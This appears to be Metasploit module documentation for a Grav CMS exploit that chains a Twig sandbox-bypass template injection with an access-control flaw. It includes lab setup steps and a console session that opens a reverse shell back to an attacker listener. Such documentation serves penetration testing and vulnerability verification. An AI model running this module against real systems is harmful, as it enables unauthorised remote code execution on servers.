## Vulnerable Application

Grav is a modern, open source flat-file content management system (CMS) built
on PHP. It uses a file-based approach instead of a traditional database,
making it lightweight and fast.

This module exploits a Server-Side Template Injection (SSTI) vulnerability
(CVE-2025-66294) in Grav CMS that allows bypassing the Twig sandbox to achieve
remote code execution. The `cleanDangerousTwig` method uses weak regex
validation that fails to sanitize nested Twig calls when using the
`evaluate_twig` function, allowing attackers to register arbitrary PHP
functions (like `system`) as Twig callbacks and execute system commands.

To inject the malicious payload into a form's process section, this module
leverages CVE-2025-66301, a broken access control flaw in the
`/admin/pages/{page_name}` endpoint that allows users with page editing
privileges to modify the form's YAML frontmatter, including the `process`
section that dictates post-submission behavior.

### Affected Versions

- **Vulnerable**: Grav CMS versions prior to 1.8.0-beta.27 (tested on 1.7.49)
- **Patched**: Grav CMS 1.8.0-beta.27 and later

### Installation

To set up a vulnerable Grav CMS instance for testing on Linux ( Here using version 1.7.49 ):

```
sudo apt update
sudo apt install -y php php-cli php-mbstring php-curl php-gd php-xml php-zip php-intl php-yaml unzip wget
cd /var/www
wget https://github.com/getgrav/grav/releases/download/1.7.49/grav-admin-v1.7.49.zip
unzip grav-admin-v1.7.49.zip
cd grav-admin
php -S 0.0.0.0:8000 system/router.php
```

Access `http://localhost:8000/admin` to complete setup and create an account with page editing permissions.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/http/grav_twig_ssti_sandbox_bypass_rce`
3. Do: `set RHOSTS [target]`
4. Do: `set USERNAME [username]`
5. Do: `set PASSWORD [password]`
6. Do: `check`
7. You should see the target is vulnerable

## Options

### USERNAME

The Grav CMS username. Requires an account with `admin.pages` permission.

### PASSWORD

The Grav CMS password.

### FORM_NAME

Optional custom form page name. Random if not set.

## Scenarios

### Exploiting Grav CMS 1.7.49 to obtain a reverse shell

```
msf6 > use exploit/multi/http/grav_twig_ssti_sandbox_bypass_rce
msf6 exploit(multi/http/grav_twig_ssti_sandbox_bypass_rce) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(multi/http/grav_twig_ssti_sandbox_bypass_rce) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/grav_twig_ssti_sandbox_bypass_rce) > set PASSWORD admin123
PASSWORD => admin123
msf6 exploit(multi/http/grav_twig_ssti_sandbox_bypass_rce) > set LHOST 192.168.1.50
LHOST => 192.168.1.50
msf6 exploit(multi/http/grav_twig_ssti_sandbox_bypass_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Grav CMS 1.7.49 is vulnerable
[*] Authenticating...
[+] Login successful
[*] Creating malicious form page...
[*] Triggering payload execution...
[*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.100:52341)

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
